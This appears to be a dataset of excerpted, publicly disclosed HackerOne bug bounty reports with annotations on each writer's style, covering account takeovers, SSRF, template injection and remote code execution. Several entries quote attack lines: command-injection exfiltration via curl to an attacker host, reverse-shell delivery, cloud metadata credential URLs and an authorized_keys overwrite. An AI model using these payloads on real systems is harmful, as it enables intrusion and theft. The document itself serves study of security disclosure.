> **steps:** Strikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:

> **rootcause:** 1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API. 2) Flickr does not check whether the e-mail address is verified on login 3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible

> **impact:** Chained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction.

> **supporting:** All tests were performed against my user accounts. The user account patterns used were as follows: * lauritz+*@wearehackerone.com * *@lauritz-holtmann.de

> **comment:** Please let me know if you have any comments or questions.

### 22. sandeep_hodkasia — account-takeover (OAuth token flaw) (report 314808)

https://hackerone.com/reports/314808

Voice: pronoun I; em-dash no; contractions no. Contains a visible spelling slip 'Desription:' for 'Description:' and non-native grammatical patterns ('allows an attacker hack all users account', 'Attacker Can hack all users account') — a real, unpolished human writeup rather than templated prose.

> **title:** Full account takeover

> **summary:** I got a security issue in reverb ios application which allows an attacker hack all users account.

> **other:** Since iOS application is not in the scope but still I am reporting this, because this vulnerability may compromise all users account. Please resolve this quickly.

> **rootcause:** Reverb ios application is not validating facebook `access_token` on the server side in login api, which allows an  attacker to hack all account using his own app access token.

> **steps:** 1. Replay vulnerable request in vulnerable request in burp suite 2. Use any other app access token .

> **supporting:** Here in vulnerable i used lyst app access token to login.

> **remediation:** Fix recommendation: https://developers.facebook.com/docs/facebook-login/security

> **impact:** Attacker Can hack all users account using his own app access token

### 23. vakzz — RCE via unsafe deserialization (GitHub import, CVE-2022-2884) (report 1679624)

https://hackerone.com/reports/1679624

Voice: pronoun mixed; em-dash no; contractions no. Near-total absence of any social or first-person framing — no greeting, no 'please', not even self-reference — the writeup reads like an internal engineering postmortem, complete with exact source-line links and a raw Sidekiq exception backtrace pasted as evidence.

> **title:** Remote Command Execution via Github import

> **summary:** This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.

> **rootcause:** This happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`.

> **rootcause:** The redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `$` size provided

> **steps:** 1. edit {F1882976} and change the command at `git_set`, that will be the command that is executed

> **steps:** run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen_payload3.rb`

> **supporting:** This can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.

> **impact:** Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

> **other:** The `Sawyer::Resource` has a `to_h` method which could potentially be used to ensure a plain has it passed around.

### 24. haxta4ok00 — Information Disclosure via GraphQL (private program data leak) (report 1618347)

https://hackerone.com/reports/1618347

Voice: pronoun I; em-dash no; contractions yes. The entire root-cause explanation is a single, grammatically loose sentence — 'Just a recent update gives the results of private programs' — with no elaboration at all, yet it fully substantiated a critical, $25,000 cross-tenant disclosure.

> **title:** Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`

> **summary:** Hi team, I understand what's going on

> **rootcause:** Just a recent update gives the results of private programs

> **steps:** GraphQL:  `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`

> **supporting:** Answer: `{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}`

> **comment:** This is Asset program - █████████

> **impact:** Disclosing Sсope(Assets) in Private Programs

> **other:** Thanks!

### 25. theflow0 — Privilege Escalation — chained 5-vulnerability sandbox/kernel exploit chain (Blu-ray Disc Java 'bd-j' sandbox escape, PS4/PS5), H1 taxonomy: Privilege Escalation (report 1379975)

https://hackerone.com/reports/1379975

Voice: pronoun mixed; em-dash no; contractions no. Opens a five-CVE kernel/sandbox exploit chain with a breezy greeting and emoji before the technical body: "Hey PlayStation! ... AFAIK, this is the first exploit chain that is being submitted to you :)" — confident informality framing extremely dense, decompiled-code-backed technical content.

> **title:** bd-j exploit chain

> **summary:** Hey PlayStation! Below are 5 vulnerabilities chained together that allows an attacker to gain JIT capabilities and execute arbitrary payloads. The provided payload triggers a buffer overflow that causes a kernel panic. Please consider each of the vulnerabilities individually. AFAIK, this is the first exploit chain that is being submitted to you :)

> **rootcause:** An attacker can replace the `userprefs` file with a malicious serialized object to **instantiate classes under privileged context**.

> **rootcause:** The class `com.oracle.security.Service` contains a method `newInstance` which calls `Class.forName` on an arbitrary class name. **This allows arbitrary classes, even restricted ones (for example in `sun.`), to be instantiated**.

> **rootcause:** This struct contains a pointer at offset 0x38 (we call it `compiler_data`) from the compiler process which is used to make a backup of the request structure. An attacker can simply send an untrusted pointer and the compiler receiver thread will copy data from the request into its memory. In other words, **we have a write-what-where primitive**.

> **rootcause:** The UDF driver https://github.com/williamdevries/UDF is used on the PS4 and PS5 which contains a **buffer overflow**.

> **steps:** Attached is the exploit chain *bd-jb* as a `.iso` file which demonstrates the exploitation of vulnerabilities 1-4 that demonstrates the ability to run arbitrary payloads. Burn the iso image with UDF 2.5 file system. You can send the payload using `nc $PS4IP 1337 < payload.bin`.

> **impact:** With these vulnerabilities, it is possible to **ship pirated games on bluray discs**. That is possible even without a kernel exploit as we have JIT capabilities.

### 26. h72 — Struct type confusion in mruby leading to instruction-pointer control / RCE primitive (Shopify Scripts mruby sandbox), H1 taxonomy: Code Injection (report 181879)

https://hackerone.com/reports/181879

Voice: pronoun I; em-dash no; contractions yes. Casual, confident brevity for a critical RCE: opens "Heya!" and signs off "Cheers," around a claim of taking "control of the instruction pointer" — the whole disclosed report body is barely five short paragraphs.

> **title:** Struct type confusion RCE

> **summary:** Heya! I've been poking at mruby a bit more and I've found a vulnerability that allows an attacker to take control of the instruction pointer.

> **steps:** I've attached a proof of concept script that when run in mruby will jump to `0x0000133713371337` and segfault.

> **impact:** While the proof of concept script just jumps to an attacker controlled address and crashes, it would almost certainly be possible to achieve full remote code execution, especially given an arbitrary read/write primitive (which is easily created using the same techniques as in the proof of concept)

> **comment:** The proof of concept script has detailed annotations throughout about how it works, but I'm also happy to clarify anything if need be :) Cheers, ███████

### 27. prickn9 — Insecure Direct Object Reference (IDOR) — unauthenticated/unauthorized deletion of another user's Snapchat Spotlight content via GraphQL mutation id substitution, H1 taxonomy: IDOR (report 1819832)

https://hackerone.com/reports/1819832

Voice: pronoun I; em-dash no; contractions no. Clear non-native-English phrasing throughout, e.g. "And the video of other user will get delete" and "Imagine deleting video biggest influencers and content creators" — grammatically rough but the exploit reasoning and repro steps are precise and it drew a $15,000 bounty and 789 upvotes.

> **title:** Delete anyone's content spotlight remotely.

> **summary:** Hello Snapchat,  Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat users and profit in millions. I found a way to delete anyone's spotlight remotely.

> **steps:** 1. First go to https://my.snapchat.com/myposts and log in there. 2. You will see your posts . 3. Now turn burp suite and intercept. 4.Select any of your posts and click delete option. 5. Now capture the delete request. In delete request there is parameter of id

> **steps:** 6. You just have to change this id parameter. You can easily get the id parameter. Now forward the request after replacing id with someone's else video id. And the video of other user will get delete.

> **supporting:** HOW TO GET ID PARAMETER 1. Whenever you share spotlight you can see the parameter in the url as: https://story.snapchat.com/spotlight/█████

> **impact:** Delete anyone's Content Spotlight. Imagine deleting video biggest influencers and content creators.

### 28. mr_asg — Mass account takeover via IDOR in TaxJar's Accountant-Access/email-change flow (no victim interaction required), H1 taxonomy: Authentication Bypass Using an Alternate Path or Channel (report 1685970)

https://hackerone.com/reports/1685970

Voice: pronoun I; em-dash no; contractions no. Slightly non-native phrasing under real technical precision, e.g. "which causing changing the email in the account associated with the number that was manipulated ." — grammar wobbles but the automated-loop mass-exploitation logic is exact.

> **title:** Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/ 

> **rootcause:** I discovered an IDOR in the Accountant Access form in Taxjar. This could have allowed an attacker to take over any user's account.

> **steps:** The vulnerability was caused by  manipulating the user's number in the POST request to `/accounts/<ACCOUNT_NUMBER>` with adding the user's email parameter carrying the attacker's email in the payload data in the request, which causing changing the email in the account associated with the number that was manipulated .

> **steps:** And by a Proof Of Concept Python script, I made a loop in which the account number and the attacker’s email were changed every time, which demonstrated the attacker’s ability to carry out the attack against a large number of accounts .

> **supporting:** The Write-up here : https://medium.com/@mrasg/mass-account-takeover-in-stripes-taxjar-a-one-click-exploit-6fd13bb75f04

> **remediation:** The vulnerability was caused by not correctly validating whether or not the reset password token was connected to the user being reset and was resolved by relying on the user fetched from the reset password token itself instead of the account ID provided in the URL.

### 29. 0xrayan1996 — Information Disclosure via GraphQL mutation (private email leak) — HackerOne's own SaveCollaboratorsMutation exposes a collaborator's email before they accept the invite (report 2032716)

https://hackerone.com/reports/2032716

Voice: pronoun impersonal; em-dash no; contractions no. The title itself has a duplicated-verb typo — "An attacker can can view any hacker email" — consistent with the non-native phrasing and comma splices running through the whole body.

> **title:** An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name 

> **summary:** An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their private email.

> **steps:** 1 - Create a dummy report and send it 2 - Add a hacker that you want to disclose his email  , Max is only 2 invites per report 3 - send the invite after sending the invite the hacker will be pending status until accept the report .

> **steps:** 4- Go the pen on the right for adding more collaborator and click on the pen and capture traffic , you will see the user email in first request, even that the user not accept the invitation yet

> **supporting:** {"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999}

> **impact:** An attacker can view any user's email registered with Hackerone as hacker .

### 30. xtt0k (current H1 handle: fl4w) — Account Takeover via Authentication Bypass in TikTok account recovery (Android) (report 2443228)

https://hackerone.com/reports/2443228

Voice: pronoun I; em-dash no; contractions no. The entire public record of the researcher's own words is a single polished sentence — "I appreciate TikTok's swift action in resolving this issue and their generous bounty" — there is no raw write-up to compare it against, only this retrospective summary.

> **summary:** An improper authentication mechanism in TikTok's account recovery process could have been used for account takeovers on Android devices. There was no evidence of exploitation and this vulnerability has now been completely fixed. We thank @xtt0k for reporting this to our team and confirming its remediation. 

> **summary:** I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling. This flaw could have allowed a TikTok account to be taken over by knowing the account username. I appreciate TikTok's swift action in resolving this issue and their generous bounty.

### 31. damian89 — Information Disclosure (exposed production Grafana dashboards, Snapchat) (report 663628)

https://hackerone.com/reports/663628

Voice: pronoun I; em-dash no; contractions no. The dropped article in "valuable data about company" (rather than "the company") is a small but telling non-native English marker, even in what is clearly the polished, final public-facing summary.

> **summary:** @damian89 found a production Grafana instance which displayed confidential metrics inside various dashboards. 

> **summary:** While fuzzing patterns of certain snapchat related projects, I was able to find an instance of Grafana which was accessible by a guest user. That instance contained hundreds of production dashboards, valuable data about company. Furthermore one of the custom modules was vulnerable to SQL Injection.

### 32. japz (Japz Divino / pinoywhitehat) — Business Logic Flaw / Auth Bypass — 2FA-submission-requirement and reporter-blacklist bypass via embedded submission form (report 418767)

https://hackerone.com/reports/418767

Voice: pronoun I; em-dash no; contractions no. Consistently writes the first-person pronoun as a lowercase 'i' throughout ("i get this ->>", "it is good that i was block") instead of capitalizing it — a small, persistent stylistic tic across the whole report.

> **title:** Hacker can bypass 2FA requirement and reporter blacklist through embedded submission form

> **summary:** A program owner can enforce the hackers to setup the two-factor authentication before submitting new reports to their program here: https://hackerone.com/parrot_sec/submission_requirements (see below image)

> **rootcause:** The [Parrot Sec](https://hackerone.com/parrot_sec) program has this feature enabled to enforce the hackers to setup `2FA` before submitting reports. I removed my `2FA` to test and it is good that i was block from submitting new reports (see below image)

> **steps:** 1. Login to your account and __remove__ your 2FA on your account (if you already setup it) 2. Now go to https://hackerone.com/parrot_sec and hit `Submit Report` button, observed that you cannot submit report unless you will enable your 2FA. 3. __BYPASS:__ Get the `Embedded Submission` URL on their [policy page](https://hackerone.com/parrot_sec): i get this ->> https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions/new

> **impact:** Bypassing the enabled protection/feature of the program.

> **comment:** Let me know if anything else is needed. Regards Japz

### 33. 0xacb — SSRF chained to GCP cloud-metadata theft and Kubernetes cluster RCE (Shopify Exchange) (report 341876)

https://hackerone.com/reports/341876

Voice: pronoun I; em-dash no; contractions yes. Dryly undercuts his own escalation attempt mid-report — "I didn't tried to delete running pods, obviously, I'm not sure if I would be able to delete them with user" — a moment of self-aware restraint in a chain that otherwise ends in full cluster RCE.

> **title:** SSRF in Exchange leads to ROOT access in all instances

> **summary:** ## The Exploit Chain - How to get root access on all Shopify instances

> **rootcause:** Exploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.

> **steps:** I created a new store and pulled attributes from this instance recursively: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

> **supporting:** **Metadata concealment** (https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment) is not enabled, so the `kube-env` attribute is available.

> **severity:** The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker.

> **comment:** *Huge thanks to [Luís Maia](https://www.linkedin.com/in/luis-maia-7714023a) [0xfad0](http://hackerone.com/0xfad0), for helping me build this █████*

### 34. fransrosen — Command injection / RCE via bulk customer update (ImageTragick upload on Shopify's internal Kit CRM) (report 422944)

https://hackerone.com/reports/422944

Voice: pronoun I; em-dash no; contractions no. Written entirely in first-person singular ("I also verified I can access AWS metadata") throughout, yet signed off jointly as "Frans and Mathias" without the word "we" ever appearing — one co-author narrating both of their combined work.

> **title:** H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products

> **summary:** kitcrm.com allows the administrator to upload priority product images located at: https://kitcrm.com/seller/onboarding/1

> **rootcause:** These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload

> **steps:** sh: no job control in this shell sh-4.2$ whoami whoami deploy

> **supporting:** I can also confirm this is internally for Shopify since the README refers to an internal repo of github.com/Shopify:

> **supporting:** I also verified I can access AWS metadata:

> **remediation:** You should immediately make sure Postscript files cannot be uploaded here, or urgently update or remove Ghostscript from the imagemagick instance.

> **comment:** Regards, Frans and Mathias

### 35. zombiehelp54 — Server-side template injection (Handlebars, Shopify Return Magic app) -> suspected code execution (report 423541)

https://hackerone.com/reports/423541

Voice: pronoun I; em-dash no; contractions yes. The Impact section, which is normally where a report should sell severity, instead ends with the shrug emoticon '¯\_(ツ)_/¯' after the phrase 'Could be a Server Side template injection that can be used to take over the server' - genuine hedged uncertainty on a bug that turned out to be a real, bountied SSTI.

> **title:** H1514 Server Side Template Injection in Return Magic email templates?

> **summary:** Possible template injection in return magic email templates.

> **rootcause:** I've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid.

> **rootcause:** I set the email template to the following and then test the template and then the results go to my gmail inbox.

> **rootcause:** `{{ this.__proto__.constructor.name }}` --> `Object` I couldn't go further but it seems like the backend is NodeJs.

> **steps:** Click Edit for any email template then at the editor click the code icon and enter `{{this}}`

> **steps:** Go back to **Workflow** page and click **Send me a test email** for the template you edited then enter your email and check your inbox.

> **impact:** Could be a Server Side template injection that can be used to take over the server ¯\_(ツ)_/¯

### 36. vakzz — Command injection (git flag/argument injection via API ref parameter) -> local file overwrite -> RCE (report 658013)

https://hackerone.com/reports/658013

Voice: pronoun impersonal; em-dash no; contractions yes. Adopts GitLab's own contributor bug-template headers verbatim ('What is the current *bug* behavior?' / 'What is the expected *correct* behavior?') inside a security report, blurring the line between a bug report and a vuln report.

> **title:** Git flag injection - local file overwrite to remote code execution

> **summary:** The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command.

> **steps:** 1. Create a wiki new wiki page called `page` with the commit message `controlled content`

> **steps:** 3. Run the Search API with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys` 4. ssh into gitlab using the created key:

> **rootcause:** The `ref` param is passed directly to the git command without being sanitized.

> **remediation:** The `ref` param should be sanitized or used in a way that doesn't allow for flag injection

> **impact:** This can be used to overwrite `/var/opt/gitlab/.ssh/authorized_keys` with an attackers key by following the above steps allowing remote access and code execution.

> **impact:** An attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the `git` user

> **supporting:** $ id uid=998(git) gid=998(git) groups=998(git)

### 37. jobert — Improper access control (GitLab project-import feature injects an attacker-controlled service template that later projects auto-install, enabling exfil/mutation of repo+project data) (report 446585)

https://hackerone.com/reports/446585

Voice: pronoun I; em-dash no; contractions yes. The reporter voluntarily caps his own proof: 'This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com' - an explicit ethical/production-safety restraint stated in plain first person rather than glossed over.

> **title:** Exfiltrate and mutate repository and project data through injected templated service

> **rootcause:** The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template.

> **rootcause:** This means that when an attacker has created a templated service that is valid, any project created after that, will automatically install the attacker's service for that project.

> **steps:** Replace `"template":false` in the `services` array with `"template":true`

> **steps:** Extract the files, it'll contain a `project.json` file

> **impact:** An attacker can decide on what strategy to take with this vulnerability. The most interesting ones that I could find are described below.

> **impact:** The `EmailsOnPushService` has the option to include a commit diff in an email.

> **other:** Unconfirmed: **Mutating data** The Slack service / integration allows a user to also interact with objects in a project.

> **other:** This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com and I was not able to set up the Slack integration on my own GitLab instance.

### 38. oskarsv — Code injection (HTML injection bypassing CSP via area/map tags, chained to Electron BrowserWindow leak) -> Remote Code Execution in Slack desktop app, plus a bonus stored-XSS on files.slack.com (report 783877)

https://hackerone.com/reports/783877

Voice: pronoun I; em-dash no; contractions yes. Hedges his own scope call inline with a bare parenthetical question mark - 'it seems the domain is out of scope (?)' - then reports the bug anyway, and closes the whole writeup with an informal hacker-style 'TL;DR' bullet list rather than a formal executive summary.

> **title:** Remote Code Execution in Slack desktop apps + bonus

> **summary:** With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps.

> **summary:** I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.

> **rootcause:** However, it is still possible to inject `area` and `map` tags, which can be used to achieve a one-click-RCE.

> **steps:** bw = window.open('about:blank') // leak BrowserWindow class

> **impact:** Essentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a "tunnel" via `BrowserWindow` to execute arbitrary Javascript

> **impact:** - payload could be made "wormable" - re-post to all user workspaces after click

> **supporting:** Since it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack.

> **other:** **all files of course must be shared with the recipients via the usual methods** otherwise private files are inaccessible

### 39. orange — SSTI (Jinja2) -> RCE (report 125980)

https://hackerone.com/reports/125980

Voice: pronoun I; em-dash no; contractions no. Signs off with a plain-text emoticon instead of a formal closing: "Thanks for your patience for reading my report. : )"

> **title:** uber.com may RCE by Flask Jinja2 Template Injection

> **summary:** Hi, Uber Security Team I found an RCE in rider.uber.com.

> **steps:** if you change your profile name to {{ '7'*7 }}, and you will receive a mail "Your Uber account information has been updated" sent by support@uber.com

> **rootcause:** This is a vulnerability about Flask Template Engine(Jinja2) Injection , more detail can be seen in these blogs

> **supporting:** {{ [].__class__.__base__.__subclasses__() }} # get all classes

> **supporting:** {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

> **impact:** I think it can be a Remote Code Execution vulnerability but there is a length limit :(

> **comment:** Thanks for your patience for reading my report. : )

### 40. filedescriptor — Improper authentication (Digits origin-validation bypass) -> account takeover (report 129873)

https://hackerone.com/reports/129873

Voice: pronoun I; em-dash no; contractions no. Structures the free-text report body itself with ad hoc markdown section headers ("#Detail", "#Impact", "#PoC", "#Fix") as if pre-formatting it for a blog post.

> **title:** Bypassing Digits origin validation which leads to account takeover

> **summary:** I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover.

> **rootcause:** onReceiveMessage: function(t) {     this.config && -1 !== this.config.get("sdk_host").search(t.origin) && this.resolve(t.data) },

> **rootcause:** a dot (.) is treated as a wildcard. In other words, any character of Digits' origin can be replaced with a dot.

> **steps:** 1. Make sure you have logged in Fabric.io 2. Go to https://www.d.gits.co/fabric.html 3. Click the button 4. You will see a phone number is automatically associated with your account

> **impact:** It affects websites that have integrated Digits signin feature, leading to potential account takeover issue on those websites. Twitter official applications like Fabric is also affected.

> **supporting:** Notice the attack can be done silently without user interaction and awareness.

> **remediation:** In my opinion, a simple string comparison is enough for validation. Therefore I recommend changing it to use either `indexOf` or `===`.

### 41. tomerpeled92 — Code injection -> privilege escalation on Windows nodes (CVE-2023-5528, in-tree storage plugin) (report 2231019)

https://hackerone.com/reports/2231019

Voice: pronoun mixed; em-dash no; contractions yes. Uses lowercase "i" throughout for the first-person pronoun and interleaves it with verbatim quoted third-party email voices (the Kubernetes team's "We'll keep you updated").

> **title:** CVE-2023-5528: Insufficient input sanitization in in-tree storage plugin leads to privilege escalation on Windows nodes

> **summary:** This is an imported report from the email i have sent a month ago about a code injection vulnerability

> **other:** As a reference i have talked with Balaji from the k8 team.

> **comment:** "Just a quick update to let you know that we were able to reproduce the issue and are working on a fix. CVE-2023-5528 has been reserved for this issue. We'll keep you updated on the next steps as we review the proposed fix."

> **severity:** "Hi Tomer, This is being rated as a Tier 1 High severity ($5,000) bounty."

> **impact:** Code execution from kubelet context(SYSYTEM privileges) on all windows nodes on a cluster.

### 42. battle_angel — Server-Side Template Injection (sign-up First Name field) (report 1104349)

https://hackerone.com/reports/1104349

Voice: pronoun mixed; em-dash no; contractions yes. The offhand admission 'maybe because the code broke' — the researcher isn't sure why a side account stopped getting mail, and says so plainly instead of smoothing it into a confident claim.

> **summary:** Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

> **summary:** In this scenario, when an attacker signs up on the platform and uses a payload in the **First Name** field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user

> **steps:** Step 2: Now, in the ```First Name``` field, enter the value ```{{7*7}}```

> **steps:** Step 6: Notice that the email arrives with the Subject as ```49, welcome to Glovo!```

> **steps:** Step 7: The attacker can now further exploit this issue by injecting malicious payloads in the Name field and gathering sensitive information from the application.

> **supporting:** Note- After carrying out this attack, I didn't receive any welcome email for my other account maybe because the code broke.

> **impact:** Unsafely embedding user input in templates enables Server-Side Template Injection, which can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

### 43. honoki — SSRF via webhook redirect (HTTP 303) leading to AWS credential theft (report 508459)

https://hackerone.com/reports/508459

Voice: pronoun I; em-dash no; contractions no. The report reads like a lab protocol — numbered bullet reproduction steps and a dedicated 'Recommendation' section — with almost no personal flourish, favoring precision over voice.

> **summary:** Due to a vulnerability in the way webhooks are implemented, an attacker can make arbitrary HTTP/HTTPS requests from the application server and read their responses. This is known as a server-side request forgery (SSRF) vulnerability.

> **rootcause:** The vulnerability exists in the way webhooks follow redirects. In general, it appears that redirects are not followed, but a HTTP 303 See Other status code allows an attacker to bypass this restriction.

> **rootcause:** By pointing my webhook URL to a server that issues a 303 redirect, I am able to redirect and read the responses of arbitrary HTTP/HTTPS requests from the application server.

> **steps:** <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>

> **steps:** Note the `200 OK` status code indicating a successful redirect

> **remediation:** I recommend to ensure all input provided to the endpoint is validated. In this case, ensure that 303 redirects are not followed either.

> **impact:** By exploiting this vulnerability, an unauthorized attacker could gain access to the AWS environment of Omise.

### 44. silentecho_ — SSRF (H1-2006 2020 CTF) (report 887766)

https://hackerone.com/reports/887766

Voice: pronoun impersonal; em-dash no; contractions no. The entire substantive content is one casual sentence ending in a smiley — a rare case where the 'report' is really just a placeholder that was disclosed as-is.

> **title:** [H1-2006 2020]   CTF Writeup

> **other:** Just submitting Flag for now, Will soon submit Writeup :)

> **impact:** Flag: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

### 45. niwasaki — SSRF via url= parameter, filter bypass using line-feed injection (%0A) (report 514224)

https://hackerone.com/reports/514224

Voice: pronoun mixed; em-dash no; contractions no. Slightly non-native phrasing throughout ('response body is empty. (/security-credentials exists)') gives the timing-oracle logic an almost lab-notebook, telegraphic cadence.

> **summary:** `https://search.usa.gov/help_docs` endpoint is vulnerable to SSRF via `url` parameter. The parameter is protected but can be bypassed using LF (%0A).

> **steps:** If you insert `http://127.0.0.1:21/?%0A` before `url` parameter and send request, then response time is about 450ms. (Port is closed)

> **steps:** If you insert `http://127.0.0.1:22/?%0A` before `url` parameter and send request, then response time is about 10,468ms. (Port is open)

> **steps:** If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0A` before `url` parameter, then response body is empty. (/security-credentials exists)

> **steps:** If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A` before `url` parameter, then response body is `Unable to retrieve` error. (/security-credentialx does not exists)

> **impact:** Attacker can scan your local network, finding internal port, and internal web applications. This may help with mapping what the infrastructure looks like and can help plan exploiting other vulnerabilities.

### 46. dphoeniixx — SSRF via upload function (partial-content/range abuse) leading to GCP metadata token theft (report 549882)

https://hackerone.com/reports/549882

Voice: pronoun I; em-dash no; contractions yes. Grammar wobbles like 'If there rest' and 'with 200Bof data' sit right next to genuine narrative excitement ('it was a great moment for me because it was the first SSRF with the most critical impact I have ever found') — unmistakably a real person telling their own discovery story, not a template.

> **comment:** For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437

> **comment:** Using our upload feature, the user was able to force an SSRF to occur.

> **summary:** I have found an SSRF vulnerability by exploiting content partial flow which the Vimeo upload function implements in the uploading process.

> **rootcause:** I noticed unusual headers, like Range, Content-Range. But its name was enough to tell me what it's work.

> **steps:** Suddenly, an idea came to me, what if I didn't send the full file to the server? For example, if my server responded to the backend server telling it that the file length was 500B, the server will request the 500B, now what if I responded to the server with 200Bof data? let's try it ;)

> **steps:** What If my server responded with a redirect response? vimeo will follow the redirect? store the response? request me the rest? If there rest

> **impact:** I changed the redirect target to http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token, reproduced the attack and I was able to get their compute engine API access token! it was a great moment for me because it was the first SSRF with the most critical impact I have ever found.

> **other:** Thanks for reading ;)

> **other:** Apr 29th: Triaged by HackerOne team.Apr 29th: Vimeo rewarded me initially.May 1st: The vulnerability has been fixed.May 1st: Vimeo rewarded me with the rest of the bounty.

### 47. hdbreaker — OS command injection in Nextcloud 'Extract' app plugin leading to RCE (CVE-2019-5441) (report 546753)

https://hackerone.com/reports/546753

Voice: pronoun I; em-dash no; contractions no. The closing register swings from raw shell payloads straight into formal business-letter courtesy — 'Please do not hesitate to contact me if you need any help to detect/resolve this issue. Regards,' — right after handing over a working reverse-shell chain.

> **title:** Remote Code Execution via Extract App Plugin

> **rootcause:** The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.

> **steps:** nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0

> **steps:** The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl

> **steps:** After these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file

> **impact:** An authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.

> **comment:** Hope this could help to improve your security and check continuously the Applications that you spread using your market.

> **comment:** Please do not hesitate to contact me if you need any help to detect/resolve this issue. Regards,

### 48. alexbrasetvik — Prototype pollution -> Remote Code Execution (Elastic Kibana 7.6.2) (report 852613)

https://hackerone.com/reports/852613

Voice: pronoun I; em-dash no; contractions yes. Playful, smiley-laden reporter tone paired with a company-invented joke bonus name, e.g. "this report qualifies for the Elastic It To The Man bonus."

> **title:** Remote Code Execution on Cloud via latest Kibana 7.6.2

> **summary:** A prototype pollution in Kibana can be used to gain remote code execution.

> **rootcause:** There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of _.set: We can pollute the prototype by providing a specially crafted "upgrade-assistant-telemetry" "saved object".

> **steps:** The following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can DELETE /.kibana* and restart it to get going again.

> **steps:** The payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-

> **impact:** Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

> **supporting:** The attached video recording walks through the entire attack chain.

> **comment:** Damn, @alexbrasetvik, you are unstoppable! Seriously impressive find! 💪🏻

> **comment:** Being remote-code execution on our Cloud environment, we do believe this falls under Critical severity. Additionally, being the first RCE we've received, this report qualifies for the Elastic It To The Man bonus.

> **comment:** Well deserved. Find more prototype pollution :) -Tony

